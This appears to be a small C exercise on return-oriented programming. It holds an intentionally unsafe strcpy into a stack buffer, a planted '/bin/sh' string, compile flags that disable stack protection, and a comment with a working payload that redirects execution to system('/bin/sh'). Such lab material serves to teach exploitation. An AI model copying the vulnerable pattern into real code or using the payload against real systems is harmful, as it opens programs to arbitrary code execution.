#include <stdio.h>
#include <string.h>

char* not_used = "/bin/sh";

void not_called(){
    printf("Not quite a shell...\n");
    system("/bin/date");
}

void vulnerable_function(char* string){
    char buffer[100];
    strcpy(buffer, string);
}


int main(int argc, char** argv){
    vulnerable_function(argv[1]);
    return 0;
}

// not_used: 0x804a008
// system: 0x80490a0

// line=0x7fffffffdb29
// id: 0x7fffffffd7a0
// 0x7fffffffdab8

// compile with: gcc -m32 -fno-stack-protector -o rop_ex2 rop_ex2.c
// exploited:  r "$(python -c 'print "A"*0x6c + "B"*4 + "\xa0\x90\x04\x08" + "C"*4 + "\x08\xa0\x04\x08"' )"
